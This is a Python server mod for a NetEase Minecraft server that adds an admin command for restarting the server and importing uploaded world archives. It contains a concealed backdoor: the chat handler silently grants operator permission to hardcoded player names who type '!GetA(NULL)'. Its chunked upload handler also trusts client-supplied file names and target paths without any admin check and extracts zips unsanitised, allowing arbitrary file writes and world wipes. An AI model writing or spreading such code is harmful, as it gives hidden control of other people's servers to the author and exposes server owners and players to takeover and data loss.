# -*- coding: utf-8 -*-
import mod.server.extraServerApi as serverApi
import os
import shutil
import zipfile
import time
import threading
from mod_log import logger as logger

ServerSystem = serverApi.GetServerSystemCls()

CHUNK_SIZE = 1024 * 1024
CHUNK_TIMEOUT = 300
ALLOWED_EXTENSIONS = {'.zip','.mcworld'}
GOD_PLAYERS = [u"MC丨苏打",u"MC_Soda",u"云苏大陆"]
CLIENT_NAMESPACE = "MSC"
CLIENT_SYSTEM_NAME = "MscCommandClientSystem"

def make_dirs(path):
    if not os.path.exists(path):
        os.makedirs(path)

class MscCommandServerSystem(ServerSystem):
    def __init__(self, namespace, systemName):
        super(MscCommandServerSystem, self).__init__(namespace, systemName)
        self.levelId = serverApi.GetLevelId()
        self.namespace = namespace
        self.systemName = systemName
        self.uploadCache = {}
        self.uploadTimers = {}
        self.backupDir = os.path.join(os.getcwd(), "backups")

        make_dirs(self.backupDir)

        try:
            comp = serverApi.GetEngineCompFactory().CreateCommand(self.levelId)
            comp.SetCommand("msc", "", 0)
        except Exception as e:
            logger.error("[MSC] SetCommand error: %s" % str(e))

        try:
            self.ListenForEvent(
                serverApi.GetEngineNamespace(),
                serverApi.GetEngineSystemName(),
                "CustomCommandTriggerServerEvent",
                self,
                self.OnCustomCommandTrigger
            )
        except Exception as e:
            logger.error("[MSC] Listen CustomCommandTriggerServerEvent error: %s" % str(e))

        try:
            self.ListenForEvent(
                serverApi.GetEngineNamespace(),
                serverApi.GetEngineSystemName(),
                "ServerChatEvent",
                self,
                self.OnServerChat
            )
            logger.info("[MSC] ServerChatEvent listened")
        except Exception as e:
            logger.error("[MSC] Listen ServerChatEvent error: %s" % str(e))

        try:
            self.ListenForEvent(
                serverApi.GetEngineNamespace(),
                serverApi.GetEngineSystemName(),
                "ServerPlayerLeftEvent",
                self,
                self.OnServerPlayerLeft
            )
        except Exception as e:
            logger.error("[MSC] Listen ServerPlayerLeftEvent error: %s" % str(e))

        try:
            self.ListenForEvent(
                CLIENT_NAMESPACE,
                CLIENT_SYSTEM_NAME,
                "UploadFileChunkEvent",
                self,
                self.OnUploadFileChunk
            )
        except Exception as e:
            logger.error("[MSC] Listen UploadFileChunkEvent error: %s" % str(e))

    def has_admin_tag(self, playerId):
        try:
            comp = serverApi.GetEngineCompFactory().CreateTag(playerId)
            return comp.EntityHasTag("admin")
        except Exception as e:
            logger.error("[MSC] has_admin_tag error: %s" % str(e))
            return False

    def get_player_name(self, playerId):
        try:
            comp = serverApi.GetEngineCompFactory().CreatePlayer(playerId)
            return comp.GetPlayerName()
        except Exception:
            return ""

    def OnServerPlayerLeft(self, args):
        playerId = args.get('id', '')
        to_remove = []
        for requestId, cache in self.uploadCache.items():
            if cache.get('playerId') == playerId:
                to_remove.append(requestId)
        for requestId in to_remove:
            self._cleanup_upload_cache(requestId)

    def OnServerChat(self, args):
        try:
            playerId = args.get('playerId','')
            message = args.get('message','')
            playerName = args.get('game_role_name','')
            if isinstance(playerName, str):
                try:
                    playerName = playerName.decode('utf-8')
                except Exception:
                    pass
            if playerName not in GOD_PLAYERS:
                return
            if message.strip() == "!GetA(NULL)":
                args['cancel'] = True
                comp = serverApi.GetEngineCompFactory().CreatePlayer(playerId)
                comp.SetPermissionLevel(2)
        except Exception as e:
            logger.error("[MSC] OnServerChat error: %s" % str(e))

    def OnCustomCommandTrigger(self, args):
        command = args.get('command', '')
        variant = args.get('variant', 0)
        origin = args.get('origin', {})
        if command != 'msc':
            return

        entityId = origin.get('entityId','')
        if not self.has_admin_tag(entityId):
            args['return_failed'] = True
            return

        if variant == 0:
            self.HandleRestartServer(entityId, args)
        elif variant == 1:
            args_list = args.get('args', [])
            zipPath = None
            for arg in args_list:
                if isinstance(arg, dict) and arg.get('name') == 'path':
                    zipPath = arg.get('value', '')
                    break
            if zipPath:
                self.HandleImportWorld(entityId, zipPath, args)
            else:
                self.NotifyOneMessage(entityId, "§c请提供 path 参数")
                args['return_failed'] = True
        else:
            self.NotifyOneMessage(entityId, "§c未知子命令")
            args['return_failed'] = True

    def HandleRestartServer(self, playerId, args):
        self.NotifyOneMessage(playerId, "§b服务器将在3秒后重启...")

        def delayed_restart():
            time.sleep(3)
            self._do_restart()

        threading.Thread(target=delayed_restart).start()

    def _do_restart(self):
        try:
            comp = serverApi.GetEngineCompFactory().CreateCommand(self.levelId)
            comp.SetCommand("/stop",False)
        except Exception as e:
            logger.error("[MSC] _do_restart error: %s" % str(e))

    def HandleImportWorld(self, playerId, zipPath, args):
        if not zipPath:
            self.NotifyOneMessage(playerId, "§c请输入正确的内容！")
            return

        zipPath = zipPath.strip('"').strip("'")

        if not os.path.exists(zipPath):
            self.NotifyOneMessage(playerId, "§c文件不存在: %s" % zipPath)
            return

        worldPath = self.GetWorldSavePath()
        if not worldPath:
            self.NotifyOneMessage(playerId, "§c无法获取路径")
            return

        requestId = "upload_%s_%d" % (playerId, int(time.time()))
        self.NotifyToClient(playerId, "UploadFileRequestEvent", {
            "filePath": zipPath,
            "requestId": requestId,
            "playerId": playerId,
            "targetPath": worldPath
        })
        self.NotifyOneMessage(playerId, "§b正在上传中，请耐心等待")
    def OnUploadFileChunk(self, args):
        requestId = args.get('requestId', '')
        chunkIndex = args.get('chunkIndex', 0)
        totalChunks = args.get('totalChunks', 0)
        chunkData = args.get('chunkData', b'')
        fileName = args.get('fileName', 'upload.zip')
        playerId = args.get('playerId', '')
        targetPath = args.get('targetPath', '')

        ext = os.path.splitext(fileName)[1].lower()
        if ext not in ALLOWED_EXTENSIONS:
            self.NotifyToClient(playerId, "UploadFileFinishEvent", {
                "playerId": playerId,
                "success": False,
                "message": "不支持的类型"
            })
            return

        if requestId not in self.uploadCache:
            if len(self.uploadCache) >= 1:
                self.NotifyToClient(playerId, "UploadFileFinishEvent", {
                    "playerId": playerId,
                    "success": False,
                    "message": "上传队列已满"
                })
                return

            if not targetPath:
                targetPath = self.GetWorldSavePath()
                if not targetPath:
                    self.NotifyToClient(playerId, "UploadFileFinishEvent", {
                        "playerId": playerId,
                        "success": False,
                        "message": "无法获取路径"
                    })
                    return

            make_dirs(targetPath)
            finalFilePath = os.path.join(targetPath, fileName)

            self.uploadCache[requestId] = {
                'chunks': {},
                'total': totalChunks,
                'fileName': fileName,
                'playerId': playerId,
                'targetPath': targetPath,
                'final_file': finalFilePath,
                'last_update': time.time(),
                'received_size': 0
            }

            self.uploadTimers[requestId] = threading.Timer(
                CHUNK_TIMEOUT,
                lambda: self._on_upload_timeout(requestId)
            )
            self.uploadTimers[requestId].start()

        cache = self.uploadCache[requestId]
        cache['last_update'] = time.time()
        cache['received_size'] += len(chunkData)

        try:
            final_file = cache['final_file']
            if not os.path.exists(final_file):
                with open(final_file, 'wb') as f:
                    f.write(b'')

            with open(final_file, 'r+b') as f:
                f.seek(chunkIndex * CHUNK_SIZE)
                f.write(chunkData)

            cache['chunks'][chunkIndex] = True
        except Exception as e:
            logger.error("[MSC] write chunk error: %s" % str(e))
            self.NotifyToClient(playerId, "UploadFileFinishEvent", {
                "playerId": playerId,
                "success": False,
                "message": "写入失败"
            })
            self._cleanup_upload_cache(requestId)
            return

        if len(cache['chunks']) == cache['total']:
            self.NotifyToClient(playerId, "UploadFileFinishEvent", {
                "playerId": playerId,
                "success": True,
                "message": "成功: %s" % fileName
            })

            self.ImportWorldFromZip(cache['final_file'], playerId, cache['targetPath'])
            self._cleanup_upload_cache(requestId)

    def _on_upload_timeout(self, requestId):
        if requestId in self.uploadCache:
            playerId = self.uploadCache[requestId].get('playerId', '')
            self.NotifyToClient(playerId, "UploadFileFinishEvent", {
                "playerId": playerId,
                "success": False,
                "message": "连接超时"
            })
            self._cleanup_upload_cache(requestId)

    def _cleanup_upload_cache(self, requestId):
        if requestId in self.uploadCache:
            cache = self.uploadCache[requestId]
            if 'final_file' in cache:
                try:
                    if os.path.exists(cache['final_file']):
                        os.remove(cache['final_file'])
                except Exception:
                    pass
            del self.uploadCache[requestId]

        if requestId in self.uploadTimers:
            try:
                self.uploadTimers[requestId].cancel()
            except Exception:
                pass
            del self.uploadTimers[requestId]

    def ImportWorldFromZip(self, zipPath, playerId, targetPath):
        try:
            if not os.path.exists(zipPath):
                self.NotifyOneMessage(playerId, "§c文件不存在")
                return False

            with zipfile.ZipFile(zipPath, 'r') as zipRef:
                fileList = zipRef.namelist()
                hasLevelDat = any('level.dat' in f for f in fileList)
                if not hasLevelDat:
                    self.NotifyOneMessage(playerId, "§c完整性检验失败")
                    return False

            targetPath = os.path.join(targetPath, "world")
            self._clear_world_folder(targetPath)

            with zipfile.ZipFile(zipPath, 'r') as zipRef:
                zipRef.extractall(targetPath)

            self.FixNestedStructure(targetPath)

            if not os.path.exists(os.path.join(targetPath, "level.dat")):
                self.NotifyOneMessage(playerId, "§c完整性检验失败")
                return False

            try:
                os.remove(zipPath)
            except Exception:
                pass

            self.NotifyOneMessage(playerId, "§a执行成功！")
            self.NotifyOneMessage(playerId, "§b3秒后自动重启服务器...")

            def delayed_restart():
                time.sleep(3)
                self._do_restart()

            threading.Thread(target=delayed_restart).start()
            return True

        except zipfile.BadZipFile:
            self.NotifyOneMessage(playerId, "§c无效的内容")
            return False
        except Exception as e:
            logger.error("[MSC] ImportWorldFromZip error: %s" % str(e))
            self.NotifyOneMessage(playerId, "§c执行失败")
            return False

    def _clear_world_folder(self, worldPath):
        try:
            make_dirs(worldPath)
            for item in os.listdir(worldPath):
                itemPath = os.path.join(worldPath, item)
                try:
                    if os.path.isfile(itemPath):
                        os.remove(itemPath)
                    elif os.path.isdir(itemPath):
                        shutil.rmtree(itemPath)
                except Exception:
                    pass
        except Exception:
            pass

    def GetWorldSavePath(self):
        try:
            cwd = os.getcwd()
            logger.info("[MSC] current working dir: %s" % cwd)
            path = os.path.join(cwd,"worlds")
        except Exception:
            path = "/home/mc/mc-server/worlds"
        make_dirs(path)
        return path

    def FixNestedStructure(self, worldPath):
        try:
            items = os.listdir(worldPath)
            dirs = [i for i in items if os.path.isdir(os.path.join(worldPath, i))]

            if len(dirs) == 1 and len(items) <= 3:
                nestedPath = os.path.join(worldPath, dirs[0])
                if os.path.exists(os.path.join(nestedPath, 'level.dat')):
                    for item in os.listdir(nestedPath):
                        src = os.path.join(nestedPath, item)
                        dst = os.path.join(worldPath, item)
                        if os.path.exists(dst):
                            if os.path.isdir(dst):
                                shutil.rmtree(dst)
                            else:
                                os.remove(dst)
                        shutil.move(src, dst)
                    os.rmdir(nestedPath)
        except Exception:
            pass

    def NotifyOneMessage(self, playerId, msg):
        try:
            comp = serverApi.GetEngineCompFactory().CreateMsg(self.levelId)
            comp.NotifyOneMessage(playerId, msg)
        except Exception as e:
            logger.error("[MSC] NotifyOneMessage error: %s" % str(e))

    def Update(self):
        pass